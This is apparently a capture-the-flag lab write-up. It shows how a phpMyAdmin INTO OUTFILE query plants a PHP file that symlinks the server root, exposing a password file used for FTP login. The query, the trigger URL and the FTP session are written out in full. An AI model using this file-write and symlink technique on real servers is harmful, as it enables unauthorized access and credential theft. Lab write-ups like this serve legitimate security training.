# Bonus 3

Following the same mechanism of uploader injection, as explained in writeup2, we can insert through phpmyadmin a simple php code that creates a symbolic link of the root ("/") in the folder where we have read and write access, so that we can read the contents of "/home/LOOKATME" and read the "password" file, so I can access in ftp with the user "lmezard" and complete the challenges as described in writeup1.

Query for phpmyadmin:
```
SELECT "<?php symlink(\"/\", \"root_dir.php\");?>" INTO OUTFILE '/var/www/forum/templates_c/command.php'
```
Open from the browser:
```
https://192.168.56.143/forum/templates_c/command.php
```
So now in "templates_c" we have the folder "root_dir.php" which is a link to "/"

```
$ ftp 192.168.56.143
Connected to 192.168.56.143.
220 Welcome on this server
Name (192.168.56.143:umberto): lmezard
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pass
Passive mode on.
ftp> ls
227 Entering Passive Mode (192,168,56,143,227,202).
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
ftp>
```